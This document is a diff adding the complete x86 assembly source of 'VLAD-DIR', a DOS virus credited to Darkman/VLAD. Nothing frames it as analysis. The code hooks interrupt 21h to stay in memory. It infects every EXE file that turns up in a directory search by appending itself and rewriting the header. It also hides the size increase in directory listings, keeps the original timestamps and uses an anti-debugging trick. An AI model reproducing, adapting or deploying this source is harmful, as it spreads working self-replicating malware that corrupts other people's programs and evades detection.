@@ -1,0 +1,419 @@
+
+;                             Darkman/VLAD
+;                           Proudly Presents
+;                           V L A D - D I R
+
+vlad_dir     segment
+             assume  cs:vlad_dir,ds:vlad_dir,es:vlad_dir
+             org     00h
+
+code:
+             call    viruscode
+viruscode:
+             pop     bp                  ; Load BP from stack
+             sub     bp,offset viruscode ; BP = delta offset
+
+             push    ds                  ; Save DS at stack
+             push    es                  ; Save ES at stack
+
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+
+             mov     word ptr [bp+antidebug],20cdh
+antidebug:
+             mov     word ptr [bp+antidebug],0c73eh
+
+             mov     ax,6301h            ; VLAD-DIR service
+             int     21h                 ; Do it!
+             cmp     ax,bx               ; Already resident?
+             je      vdexit              ; Equal? Jump to vdexit
+
+             mov     ax,es
+             dec     ax                  ; Decrease AX
+             mov     ds,ax               ; DS = segment of programs MCB
+
+             cmp     byte ptr ds:[00h],'Z'
+             jne     vdexit              ; Not last in chain? Jump to vdexit
+             sub     word ptr ds:[03h],(memoryend-code+0fh)/10h
+             sub     word ptr ds:[12h],(memoryend-code+0fh)/10h
+             add     ax,ds:[03h]         ; AX = MCB + size of memory block
+             inc     ax                  ; AX = first usable MCB segment
+
+             cld                         ; Clear direction flag
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             mov     es,ax               ; ES = first usable program segment
+             mov     cx,(codeend-code)   ; Move 651 bytes
+             xor     di,di               ; Clear DI
+             lea     si,[bp+code]        ; SI = offset of code
+             rep     movsb               ; Move virus to high memory
+
+             xor     ax,ax               ; Clear AX
+             mov     ds,ax               ; DS = segment of interrupt table
+             lea     di,int21adr         ; DI = offset of int21adr
+             mov     si,(21h*04h)        ; SI = offset of interrupt 21h
+             movsw                       ; Store address of interrupt 21h \
+             movsw                       ; in int21adr                    /
+             mov     word ptr ds:[21h*04h],offset virusint21
+             mov     ds:[21h*04h+02h],es ; Intercept interrupt 21h
+vdexit:
+             pop     es                  ; Load ES from stack
+             pop     ds                  ; Load DS from stack
+
+             mov     ax,es
+             add     ax,10h              ; Beginning of EXE file
+             add     word ptr cs:[bp+csip+02h],ax
+
+             mov     sp,word ptr cs:[bp+sssp]
+             add     ax,word ptr cs:[bp+sssp+02h]
+             mov     ss,ax
+
+             db      0eah                ; Object code of jump far
+csip         dd      0fff00000h          ; CS:IP of infected file
+sssp         dd      ?                   ; SS:SP of infected file
+
+virusint21   proc    near                ; Interrupt 21h of VLAD-DIR
+             pushf                       ; Save flags at stack
+
+             cmp     ax,6301h            ; VLAD-DIR service?
+             je      vdservice           ; Equal? Jump to vdservice
+             cmp     ah,4eh              ; Find next matching file (DTA)?
+             je      getdtapath          ; Equal? Jump to getdtapath
+             cmp     ah,4fh              ; Find first matching file (DTA)?
+             je      infectdta           ; Equal? Jump to infectdta
+             cmp     ah,11h              ; Find first matching file (FCB)?
+             je      getfcbpath          ; Equal? Jump to getfcbpath
+             cmp     ah,12h              ; Find next matching file (FCB)?
+             je      getfcbpath          ; Equal? Jump to getfcbpath
+
+             popf                        ; Load flags from stack
+             db      0eah                ; Object code of jump far
+int21adr     dd      ?                   ; Address of interrupt 21h
+vdservice:
+             mov     bx,ax
+             popf                        ; Load flags from stack
+             iret                        ; Interrupt return!
+getdtapath:
+             push    ax                  ; Save AX at stack
+             push    di                  ; Save DI at stack
+             push    si                  ; Save SI at stack
+             push    es                  ; Save ES at stack
+
+             cld                         ; Clear direction flag
+             lea     di,filename         ; DI = offset of filename
+             mov     si,dx
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+             mov     filenameoff,di      ; Store offset of filename
+movepathdta:
+             lodsb                       ; Load a byte of path
+             or      al,al               ; End of path?
+             je      pathdtaexit         ; Equal? Jump to pathdtaexit
+             stosb                       ; Store a byte of path
+
+             cmp     al,':'              ; Possible end of path?
+             je      setnameoff          ; Equal? Jump to setnameoff
+             cmp     al,'\'              ; Possible end of path?
+             jne     movepathdta         ; Not equal? Jump to movepathdta
+setnameoff:
+             mov     filenameoff,di      ; Store offset of filename
+             jmp     movepathdta
+pathdtaexit:
+             pop     es                  ; Load ES from stack
+             pop     si                  ; Load SI from stack
+             pop     di                  ; Load DI from stack
+             pop     ax                  ; Load AX from stack
+infectdta:
+             call    dword ptr cs:int21adr
+
+             push    ax                  ; Save AX at stack
+             push    bx                  ; Save BX at stack
+             push    cx                  ; Save CX at stack
+             push    dx                  ; Save DX at stack
+             push    di                  ; Save DI at stack
+             push    si                  ; Save SI at stack
+             push    ds                  ; Save DS at stack
+             push    es                  ; Save ES at stack
+             pushf                       ; Save flags at stack
+
+             cld                         ; Clear direction flag
+
+             mov     ah,2fh              ; Get Disk Transfer Address (DTA)
+             int     21h                 ; Do it!
+
+             mov     di,filenameoff      ; DI = offset of filename
+             mov     si,bx           
+             add     si,1eh              ; SI = offset of filename (DTA)
+             push    es                  ; Save ES at stack
+             pop     ds                  ; Load DS from stack (ES)
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+movenamedta:
+             lodsb                       ; Load a byte of filename (DTA)
+             stosb                       ; Store a byte of filename
+             or      al,al               ; End of filename?
+             jne     movenamedta         ; Not equal? Jump to movenamedta
+             
+             push    bx                  ; Save BX at stack
+             push    ds                  ; Save DS at stack
+
+             call    infectfile
+
+             pop     es                  ; Load ES from stack (DS)
+             pop     di                  ; Load DI from stack (BX)
+
+             cmp     word ptr [si+12h],'DV'
+             jne     dtaexit             ; Already infected? Jump to dtaexit
+
+             sub     es:[di+1ah],(codeend-code)
+             sbb     word ptr es:[di+1ch],00h
+dtaexit:
+             jmp     int21exit
+getfcbpath:
+             push    ax                  ; Save AX at stack
+             push    di                  ; Save DI at stack
+             push    si                  ; Save SI at stack
+             push    es                  ; Save ES at stack
+
+             mov     si,dx
+             add     si,0a4cfh           ; SI = offset of FCB
+             cmp     byte ptr [si+01h],':'
+             jne     infectfcb           ; Not equal? Jump to infectfcb
+
+             lea     di,filename         ; DI = offset of filename
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+movepathfcb:
+             lodsb                       ; Load a byte of path
+             or      al,al               ; End of path?
+             je      pathfcbexit         ; Equal? Jump to pathfcbexit
+             stosb                       ; Store a byte of path
+             jmp     movepathfcb
+pathfcbexit:
+             mov     al,'\'
+             stosb                       ; Store the last byte of the path
+             mov     filenameoff,di      ; Store offset of filename
+infectfcb:
+             pop     es                  ; Load ES from stack
+             pop     si                  ; Load SI from stack
+             pop     di                  ; Load DI from stack
+             pop     ax                  ; Load AX from stack
+
+             call    dword ptr cs:int21adr
+
+             push    ax                  ; Save AX at stack
+             push    bx                  ; Save BX at stack
+             push    cx                  ; Save CX at stack
+             push    dx                  ; Save DX at stack
+             push    di                  ; Save DI at stack
+             push    si                  ; Save SI at stack
+             push    ds                  ; Save DS at stack
+             push    es                  ; Save ES at stack
+             pushf                       ; Save flags at stack
+
+             or      al,al               ; Filename match found?
+             jne     int21exit           ; Not equal? Jump to int21exit
+
+             cld                         ; Clear direction flag
+
+             add     dx,0a4cfh           ; DX = offset of FCB
+             mov     si,dx
+
+             cmp     byte ptr [si],0ffh  ; Extended FCB ID?
+             jne     initmovefcb         ; Not equal? Jump to initmovefcb
+             add     si,07h              ; SI = offset of extended FCB
+initmovefcb:
+             push    si                  ; Save SI at stack
+             push    ds                  ; Save DS at stack
+
+             mov     cx,08h              ; Move 8 bytes
+             mov     di,filenameoff      ; DI = offset of filename
+             inc     si                  ; SI = offset of filename (FCB)
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+movenamefcb:
+             lodsb                       ; Load a byte of filename (FCB)
+             cmp     al,' '              ; End of filename?
+             je      createext           ; Equal? Jump to createext
+             stosb                       ; Store a byte of filename
+             loop    movenamefcb
+             inc     si                  ; Increase SI
+createext:
+             mov     al,'.'
+             dec     si                  ; Decrease SI
+             add     si,cx               ; SI = offset of extension (FCB)
+             stosb                       ; Create .EXE extension
+             movsw                       ; Move extension
+             movsb                       ;  "       "
+             xor     al,al               ; Clear AL
+             stosb                       ; Create a ASCIIZ filename
+
+             call    infectfile
+
+             pop     es                  ; Load ES from stack (DS)
+             pop     di                  ; Load DI from stack (SI)
+
+             cmp     word ptr [si+12h],'DV'
+             jne     int21exit           ; If infected jump to int21exit
+
+             sub     es:[di+1dh],(codeend-code)
+             sbb     word ptr es:[di+1fh],00h
+int21exit:
+             popf                        ; Load flags from stack
+             pop     es                  ; Load ES from stack
+             pop     ds                  ; Load DS from stack
+             pop     si                  ; Load SI from stack
+             pop     di                  ; Load DI from stack
+             pop     dx                  ; Load DX from stack
+             pop     cx                  ; Load CX from stack
+             pop     bx                  ; Load BX from stack
+             pop     ax                  ; Load AX from stack
+
+             retf    02h                 ; Return far and pop a word!
+             endp
+
+infectfile   proc    near                ; Infect a EXE file
+             mov     ax,3d00h            ; Open file (read)
+             lea     dx,filename         ; DX = offset of filename
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             int     21h                 ; Do it!
+             jc      infectexit          ; Error? Jump to infectexit
+
+             xchg    ax,bx               ; Exchange AX with BX
+
+             mov     ax,1220h            ; Get system file table number
+             int     2fh                 ; Do it! (multiplex)
+
+             push    bx                  ; Save BX at stack
+             mov     ax,1216h            ; Get address of system FCB
+             mov     bl,es:[di]          ; BL = system file table entry
+             int     2fh                 ; Do it! (multiplex)
+             pop     bx                  ; Load BX from stack
+
+             mov     byte ptr es:[di+02h],02h
+
+             mov     ax,5700h            ; Get file's date/time
+             int     21h                 ; Do it!
+             push    cx                  ; Save CX at stack
+             push    dx                  ; Save DX at stack
+
+             cmp     word ptr es:[di+28h],'XE'
+             jne     closefile           ; Not equal? Jump to closefile
+             cmp     byte ptr es:[di+2ah],'E'
+             jne     closefile           ; Not equal? Jump to closefile
+
+             mov     ah,3fh              ; Read from file
+             mov     cx,1ch              ; Read 28 bytes
+             lea     dx,exeheader        ; DX = offset of exeheader
+             mov     si,dx
+             int     21h                 ; Do it!
+
+             cmp     word ptr [si],'MZ'  ; EXE file?
+             je      infecttest          ; Equal? Jump to infecttest
+             cmp     word ptr [si],'ZM'  ; EXE file?
+             je      infecttest          ; Equal? Jump to infecttest
+closefile:
+             mov     ax,5701h            ; Set file's date/time
+             pop     dx                  ; Load DX from stack
+             pop     cx                  ; Load CX from stack
+             int     21h                 ; Do it!
+
+             mov     ah,3eh              ; Close file
+             int     21h                 ; Do it!
+infectexit:
+             ret                         ; Return!
+infecttest:
+             cmp     word ptr [si+12h],'DV'
+             je      closefile           ; If infected jump to closefile
+
+             cmp     word ptr [si+1ah],00h
+             jne     closefile           ; Internal overlay? go to closefile
+
+             push    si                  ; Save SI at stack
+
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+
+             add     si,0eh              ; SI = offset of SS:SP
+             lea     di,sssp             ; DI = offset of sssp
+
+             movsw                       ; Store original SP
+             movsw                       ; Store original SS
+
+             lodsw                       ; SI = offset of CS:IP
+             lea     di,csip             ; DI = offset of csip
+
+             movsw                       ; Store original IP
+             movsw                       ; Store original CS
+
+             pop     si                  ; Load SI from stack
+
+             mov     ax,4202h            ; Move file pointer to the end
+             cwd                         ; Clear DX
+             mov     cx,dx               ; Clear CX
+             int     21h                 ; Do it!
+
+             push    ax                  ; Save AX at stack
+             push    dx                  ; Save DX at stack
+
+             mov     cx,10h
+             div     cx                  ; Convert bytes to paragraphs
+
+             sub     ax,word ptr [si+08h]
+
+             mov     word ptr [si+14h],dx
+             mov     word ptr [si+16h],ax
+
+             add     dx,offset memoryend ; Calculate virus stack
+
+             mov     word ptr [si+0eh],ax
+             mov     word ptr [si+10h],dx
+
+             pop     dx                  ; Load DX from stack
+             pop     ax                  ; Load AX from stack
+
+             add     ax,(codeend-code)   ; Add the length of the virus
+             adc     dx,00h              ; Convert to 32 bit
+
+             mov     cx,512
+             div     cx                  ; Divide by pages
+
+             inc     ax                  ; Increase AX
+
+             mov     word ptr [si+04h],ax
+             mov     word ptr [si+02h],dx
+
+             mov     word ptr [si+12h],'DV'
+
+             mov     ah,40h              ; Write to file
+             mov     cx,(codeend-code)   ; Write 651 bytes
+             cwd                         ; DX = offset of code
+             int     21h                 ; Do it!
+
+             mov     ax,4200h            ; File pointer to the beginning
+             cwd                         ; Clear DX
+             mov     cx,dx               ; Clear CX
+             int     21h                 ; Do it!
+
+             mov     ah,40h              ; Write to file
+             mov     cx,1ch              ; Write 28 bytes
+             mov     dx,si               ; DX = offset of exeheader
+             int     21h                 ; Do it!
+
+             dec     si                  ; Decrease SI
+             jmp     closefile
+             endp
+
+virusname    db      ' [VLAD-DIR]'       ; Name of the virus
+virusauthor  db      ' [Darkman/VLAD]'   ; Author of the virus
+codeend:
+filenameoff  dw      ?                   ; Offset of DTA/FCB filename
+filename     db      4ch dup(?)          ; DTA/FCB filename
+exeheader    db      1ch dup(?)          ; EXE header
+memoryend:
+
+vlad_dir     ends
+end          code
+
+
